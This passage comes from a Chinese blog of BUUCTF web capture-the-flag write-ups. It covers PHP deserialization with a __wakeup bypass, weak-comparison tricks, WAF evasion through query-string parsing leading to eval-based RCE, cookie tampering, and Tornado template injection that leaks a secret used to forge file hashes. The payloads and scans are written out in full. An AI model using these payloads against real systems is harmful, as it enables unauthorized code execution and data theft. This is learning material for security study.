<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://725eb650-f8d1-40ae-b65d-7e2f77fe5288.node4.buuoj.cn:81&quot; -e php</span><br></pre></td></tr></table></figure>

<p>扫到一个<code>www.zip</code>,访问下载之,得到源码文件</p>
<p>反序列化漏洞</p>
<p><code>index.php</code>和<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">////</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>class.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到,这里需要在访问<code>index.php</code>的时候(也就是打开题目的那个页面),用GET传一个<code>select</code>字符串,这个字符串会被反序列化为对象</p>
<p><code>index.php</code>包含了<code>class.php</code>,而在<code>class.php</code>中定义了一个名为<code>Name</code>的类,其中还包含了若干魔术方法</p>
<p>其中,在<code>__destruct</code>方法中(对象被销毁时调用,执行<code>unserialize</code>时也会调用此方法),如果<code>username</code>的值为<code>admin</code>,且<code>password</code>的值为100,就会打印flag</p>
<p>因此按照要求构建<code>select</code>字符串就可以了</p>
<p><strong>快速构建字符串,直接把类以及序列化的相关代码拿到本地来执行,生成符合要求的字符串:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的代码输出字符串:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>但目前的问题是,执行反序列化时相当于生成了一个对象,因此会调用<code>__wakeup</code>方法,此方法会将<code>username</code>的值修改为<code>guest</code></p>
<p>那么现在就需要设法绕过<code>__wakeup</code>方法来执行反序列化:</p>
<p>当成员属性数量和实际的属性数量不一致的时候,可以绕过<code>__wakeup方法</code>,所以这里把属性数从2改为3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>但执行了之后发现反序列化并没有成功,这里<code>__construct</code>都没有被调用</p>
<img src="/images/buuctf-web/image-20221015184358169-166704781973445.png" alt="image-20221015184358169" style="zoom:67%;" />

<blockquote>
<p><strong>这里补充知识点:</strong></p>
<p><strong>在序列化<code>serialize</code>时, 对于<code>private</code>属性,生成字符串中的属性名表现为「类名+属性名」,也就像上面的<code>Nameusername</code></strong></p>
<p><strong>但是其实在类名的两侧还各有一个空字节,但是当复制这个字符串并直接执行反序列化的时候,这个空字节并不会被带上,反序列化函数执行时发现格式出现了错误,因此也就导致了反序列化生成对象失败</strong></p>
<p><strong>因此这里构建被反序列化的字符串时,需要人工在类名的两端各加上一个<code>%00</code></strong></p>
</blockquote>
<p>如此以来,payload为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>提交后获得flag</p>
<p>关于反序列化详细可见<a href="fd61bb58.html">unserialize</a></p>
<br>

<hr>
<br>



<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>进去之后啥也没有<img src="/images/buuctf-web/image-20221015212828444.png" alt="image-20221015212828444" style="zoom:67%;" /></p>
<p>拿<code>dirsearch</code>扫一下:(这里指定了一下请求延时,因为频繁出429可能是因为网站有防扫限制)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py dirsearch.py -u &quot;http://60994b4a-a1d4-49fb-91dc-a26b5c7a2bd1.node4.buuoj.cn:81/&quot; -e php --delay=2</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221015213020368-166704781973447.png" alt="image-20221015213020368" style="zoom:67%;" />



<p>扫到一个<code>index.php.bak</code>,访问下载它,打开之后发现是源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据源码逻辑, 需要GET传参数<code>key</code>, 必须是数字,且<code>intval</code>取整之后要等于字符串<code>str</code>的值:</p>
<p>这里的漏洞是<code>==</code>为弱相等,不检测数据类型,只要值相等就会返回<code>TRUE</code></p>
<p>并且,如果比较的一边为数字,一边为字符串,那么比较时如果字符串的开头有数字,那么会将这段数字的值作为字符串的值,直到遇到第一个字母,如果字符串的开头不是数字,那么将把字符串视为数字0.</p>
<p>那么这里的字符串就会被视为<code>123</code>,所以<code>key</code>的值传123即可</p>
<br>

<hr>
<br>

<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进来发现是一个计算器,查看源码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).<span class="title function_">val</span>()),</span><br><span class="line">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这里注意到有一个<code>calc.php</code>,尝试访问发现直接返回了源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); <span class="comment">//如果没传num,将直接打印源码</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>]; </span><br><span class="line">    <span class="comment">//黑名单过滤符号</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>); <span class="comment">//可利用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这里给<code>num</code>传命令的话会被组织,应该是有防火墙:</p>
<img src="/images/buuctf-web/image-20221015221127741-166704781973446.png" alt="image-20221015221127741" style="zoom:67%;" />

<p>这里可以利用<strong>php的字符串解析特性</strong></p>
<blockquote>
<p>php在将参数解析为变量时,会:</p>
<ul>
<li>去除开头的空白字符</li>
<li>将一些非法字符转换为下划线</li>
</ul>
<p>那么,如果防火墙会对GET传的参数<code>num</code>进行检测,那么再传参的时候只需要在<code>num</code>前面加上一个空格,传 <code>? num=...</code>即可,因为对防火墙来说,它要检查的变量是<code>num</code>,而这里的变量是<code> num</code>. 而对php来说,即使前面加了一个空格,它仍会将此变量解析为<code>num</code></p>
</blockquote>
<p>利用此漏洞成功执行命令:<img src="/images/buuctf-web/image-20221015221731309-166704781973448.png" alt="image-20221015221731309" style="zoom:67%;" /></p>
<p>这里因为过滤了好多符号,需要<strong>进行无参数的RCE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=Print_r(scandir(dirname(dirname(dirname(getcwd())))))</span><br><span class="line">这里getcwd返回当前目录的绝对路径</span><br><span class="line">dirname函数返回上级目录的绝对路径</span><br></pre></td></tr></table></figure>

<p>先尝试扫描一下目录,找找flag文件在什么地方</p>
<img src="/images/buuctf-web/image-20221015223408729.png" alt="image-20221015223408729" style="zoom:80%;" />

<p>那么需要想办法读取该文件: <strong>可以利用<code>chr</code>函数将<code>ascii</code>码转为需要的字符</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)) <span class="comment">//这些ascii码拼接起来就是</span></span><br></pre></td></tr></table></figure>



<p>另一种方法: 可以在GET中引入其他不被过滤的参数来执行命令</p>
<ul>
<li><code>get_defined_vars()</code>返回由所有已定义变量所组成的数组</li>
</ul>
<img src="/images/buuctf-web/image-20221015225417058-166704781973449.png" alt="image-20221015225417058" style="zoom:67%;" />

<p>可以看到,GET数组是其中的第一个,所以进一步,用<code>current()</code>函数取到GET数组:</p>
<img src="/images/buuctf-web/image-20221015225518264-166704781973450.png" alt="image-20221015225518264" style="zoom:67%;" />



<p>那么在GET时多传一个参数,也将出现在这个数组里:</p>
<img src="/images/buuctf-web/image-20221015225601337-166704781973451.png" alt="image-20221015225601337" style="zoom:67%;" />

<p>进一步通过<code>end()</code>函数来取到这个新添加的参数</p>
<img src="/images/buuctf-web/image-20221015225626502-166704781973452.png" alt="image-20221015225626502" style="zoom:67%;" />

<p>那么,通过<code>eval</code>来执行第二个参数的内容:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=eval(end(current(get_defined_vars())))&amp;a=show_source(&#x27;/f1agg&#x27;);</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221015230302935-166704781973454.png" alt="image-20221015230302935" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>进去查看源码,发现<code>pay.php</code></p>
<img src="/images/buuctf-web/image-20221016155959055-166704781973453.png" alt="image-20221016155959055" style="zoom: 50%;" />

<p>再查看源码,发现了提示:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="comment">// POST传password,不能是数字,且等于404</span></span><br></pre></td></tr></table></figure>

<p>那么根据php弱相等的判定,<strong>这里传404+其他非数字字符就可以了</strong></p>
<p>另外,根据网页的提示,<code>Only Cuit&#39;s students can buy the FLAG</code></p>
<p>这里看到<code>Cookie</code>中有user字段,那么把它的值改为1试试:</p>
<img src="/images/buuctf-web/image-20221016161259938-166704781973455.png" alt="image-20221016161259938" style="zoom:67%;" />

<p>这里认证成功了,但POST的数据并没有被识别</p>
<img src="/images/buuctf-web/image-20221016161146239-166704781973456.png" alt="image-20221016161146239" style="zoom:67%;" />

<p>从浏览器端使用插件POST数据,然后抓包再修改<code>Cookie</code>,成功:</p>
<img src="/images/buuctf-web/image-20221016161441429-166704781973457.png" alt="image-20221016161441429" style="zoom:67%;" />

<p><strong>这里提示数字过长,那把money用科学计数法<code>1e9</code>表示,拿到flag</strong></p>
<img src="/images/buuctf-web/image-20221016161544146-166704781973458.png" alt="image-20221016161544146" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>进来有三个链接,点开<code>flag.txt</code>是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br></pre></td></tr></table></figure>

<p><code>hints.txt:</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>

<p><code>welcome.txt</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure>



<p>观察下这里请求的url,发现都是通过<code>filename</code>参数传了文件名,然后用<code>filehash</code>参数传了一个哈希值,结合上面的提示,这个哈希值应该是来自<code>md5(cookie_secret+md5(filename))</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8b426cb6-305f-48b9-9231-dd7b76fcbfd6.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=bb8c681f3462f5158682769afeddfdfc</span><br></pre></td></tr></table></figure>

<p>那么现在需要找到<code>cookie_secret</code>的值,随便尝试一下,发现尝试一下,发现参数变成了<code>msg</code></p>
<img src="/images/buuctf-web/image-20221016163642917-166704781973459.png" alt="image-20221016163642917" style="zoom:67%;" />

<p>这里需要补充知识了: 具体解释可见<a href="f7296425.html">Web杂项</a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.tornadoweb.org/"><code>Tornado</code></a> 是一个<code>Python web</code>框架和异步网络库，起初由 <a target="_blank" rel="noopener" href="http://friendfeed.com/">FriendFeed</a> 开发. 通过使用非阻塞网络I&#x2F;O， Tornado可以支撑上万级的连接，处理 <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Push_technology#Long_polling">长连接</a>, <a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/WebSocket">WebSockets</a> ，和其他需要与每个用户保持长久连接的应用. (<strong>也就是一个开源的Web服务器软件,特点是非阻塞</strong>)</p>
</blockquote>
<p><code>Tornado</code>中能搜到关于<code>cookie_secret</code>变量的解释:</p>
<img src="/images/buuctf-web/image-20221016170103446.png" alt="image-20221016170103446" style="zoom:80%;" />





<blockquote>
<p><strong><code>render</code><strong>是<code>python</code>中的一个</strong>渲染函数</strong>，也就是一种<strong>模板</strong>，<strong>通过调用的参数不同，生成不同的网页</strong> ，如果用户对**<code>render</code>**内容可控，不仅可以注入<code>XSS</code>代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
<p>将给定的模板与给定的上下文字典组合在一起，并以渲染的文本返回一个 <code>HttpResponse</code> 对象。</p>
</blockquote>
<p>因此这里相当于传进去一个值为<code>Error</code>的参数后,被<code>render</code>处理,也就是替换到模板中的某个特定位置,并返回到浏览器上渲染呈现:</p>
<img src="/images/buuctf-web/image-20221016171017464-166704781973460.png" alt="image-20221016171017464" style="zoom:67%;" />

<p>修改这个参数的值的话,相应地也会被浏览器渲染成对应内容:</p>
<img src="/images/buuctf-web/image-20221016171125521-166704781973461.png" alt="image-20221016171125521" style="zoom:67%;" />

<p>看见了<code>render</code>,这里的考点是<code>SSTI(模板注入)</code></p>
<p><code>Tornado</code>存在一些可以访问的快速对象，例如**<code>&#123;&#123;handler.settings&#125;&#125;</code>**,里面存储着一些环境变量</p>
<p>那么就可以构造payload了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>拿到<code>cookie_secret</code>的值:</p>
<img src="/images/buuctf-web/image-20221016173021640-166704781973464.png" alt="image-20221016173021640" style="zoom:67%;" />



<p>按照提示使用python脚本来计算哈希值:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">filename = <span class="string">&quot;/hints.txt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>) </span><br><span class="line">cookie_secret = <span class="string">&quot;cbeec37a-57fa-4c1e-b6ec-d2bfa8299e8e&quot;</span></span><br><span class="line"><span class="built_in">print</span>(md5((cookie_secret+md5(filename).hexdigest()).encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest())</span><br><span class="line">//md5计算之前,字符串需要就行编码, hexdigest()将计算后的结果转为<span class="number">16</span>进制的形式</span><br><span class="line">//输出47a12639aff3f99db8fb73f4105ba530, 验证和访问hint.txt时的一致</span><br><span class="line">//接下来把/hints.txt换成/fllllllllllllag就行了</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221016174710697-166704781973462.png" alt="image-20221016174710697" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="flask的session伪造"><a href="#flask的session伪造" class="headerlink" title="flask的session伪造"></a>flask的session伪造</h2><p>在注册登录后的修改密码界面查看源码,可以找到一个网址,打开后发现是网站的源码(flask)</p>
<img src="/images/buuctf-web/image-20221016215058822.png" alt="image-20221016215058822" style="zoom:67%;" />

<p>其中<code>index.html</code>这里网站是<code>flask</code>做的, 这里看源码像是还有<code>SSTI</code></p>
